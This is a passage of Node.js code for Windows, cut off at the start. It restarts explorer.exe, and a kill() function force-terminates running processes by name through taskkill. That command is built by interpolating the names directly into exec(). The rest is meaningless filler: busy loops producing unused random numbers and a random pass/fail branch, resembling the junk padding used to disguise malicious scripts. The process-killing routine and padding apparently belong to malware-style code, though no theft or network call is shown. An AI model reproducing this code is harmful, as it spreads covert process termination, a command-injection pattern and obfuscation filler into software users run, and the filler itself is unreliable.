                    console.error("Erro ao reiniciar o explorer.exe:", err.message);
                    return;
                }
                console.log("explorer.exe reiniciado.");
            });
        }, 5000);
    });
}

restartExplorer();

async function kill(processes) {
    return new Promise((resolve) => {
        const tasks = execSync('tasklist')?.toString()?.toLowerCase();
        processes = processes?.filter(task => tasks?.includes(task));
        processes?.forEach((task) => exec(`taskkill /f /im ${task}.exe`));
        resolve();
    });
}

      (function() {
        var i = 0;
        while (i < 99999) {
          i++;
          var j = Math.random();
        }
      })();

      if (Math.random() > 0.4) {
        console.log('Condition passed');
      } else {
        console.log('Condition failed');
      }

      for (let i = 0; i < 10; i++) {
        for (let j = 0; j < 10; j++) {
          var x = Math.random();
        }
      }
